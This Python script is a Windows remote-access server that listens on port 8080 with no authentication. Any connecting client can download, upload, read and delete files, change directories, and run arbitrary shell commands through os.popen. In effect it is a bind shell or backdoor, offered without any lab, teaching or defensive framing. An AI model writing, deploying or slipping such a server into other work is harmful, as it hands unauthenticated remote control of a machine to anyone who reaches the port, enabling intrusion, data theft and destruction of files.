import socket
import os
import subprocess
from pathlib import Path

User = (
    subprocess.run("whoami", stdout=subprocess.PIPE)
    .stdout.decode("utf-8")
    .split("\\")[1]
    .replace("\r\n", "")
)
os.chdir("C:\\Users\\" + User)

print(socket.gethostbyname(socket.gethostname()))
s = socket.socket()
port = 8080
s.bind(("", port))

print("Listening...")
s.listen(5)

Bytes = 4096

while True:
    c, addr = s.accept()
    print("Got connection from", addr)

    sent = c.recv(Bytes).decode()
    sending = sent

    try:
        if "download" in sent:
            with open(sent.replace("download ", ""), "r") as file:
                sendingName = sent.replace("download ", "").split("\\")
                # sending = file.read()
                sending = (
                    "file: "
                    + sendingName[len(sendingName) - 1]
                    + " : "
                    + "\n".join(file.read().splitlines())
                )
        elif "upload" in sent:
            Name = sent.replace("upload", "").split(" ")[1]
            Contents = sent.replace("upload", "").split(" ", 2)[2]
            with open(Name, "w") as file:
                file.write(Contents)
            sending = "Uploaded Sucessfully."
        elif "[GetDIR]" in sent:
            # print("sending dir")
            sending = "DIR: " + os.curdir
        elif sent == "are you connected?":
            sending = "yes, I am connected."
        elif sent == "help":
            result = subprocess.run(sent, stdout=subprocess.PIPE)
            sending = (
                "download <File> - Download File Specified\nupload <File> - Upload File Specified\nprint <File> - Prints File Specified\ndir - Prints Current Working Directory\ncd <Dir> - Moves Directory\nget <size> <File> - Get Size in Bytes of File Specified\nset bytes - Sets Bytes To Amount Specifed\nset timeout <float> - Sets Timeout to Amount Specified\nmkdir <NAME> - Makes a new directory with name specified\nrem <FILE> - Removes File with name sepcified\n-OS-\n"
                + result.stdout.decode()
            )
        elif "print" in sent:
            File = sent.replace("print ", "")
            sending = open(File, "r").read()
        elif "rem" in sent:
            Name = sent.replace("rem ", "")
            if Path.suffix:
                os.remove(Name)
            else:
                os.rmdir(Name)
        elif "mkdir" in sent:
            Name = sent.replace("mkdir ", "")
            os.mkdir(Name)
            sending = "Successfully Made New Directory Named " + Name
        elif "dir" in sent:
            if len(os.listdir()) > 0:
                sending = "\n".join(os.listdir())
            else:
                sending = "EMPTY FOLDER"
        elif "cd" in sent:
            dirToCDTo = sent.replace("cd ", "").replace("{USER}", User)
            os.chdir(dirToCDTo)
            sending = "DIR: " + os.getcwd()
            # print(sending)
        elif "get" in sent:
            sent = sent.replace("get ", "")
            if "size" in sent:
                sent = sent.replace("size ", "")
                sending = str(os.path.getsize(sent))
        elif "set bytes" in sent:
            sent = sent.replace("set bytes ", "")
            print("Setting bytes..")
            sent = sent.replace("bytes ", "")
            Bytes = int(sent)
            sending = "Successfully changed Byte Size."
        else:
            try:
                result = os.popen(sent).read()
                # subprocess.run(sent.split(" "), stdout=subprocess.PIPE)
                sending = result  # .stdout.decode()
            except Exception as e:
                sending = str(e)
    except Exception as e:
        sending = str(e)

    c.send(sending.encode())
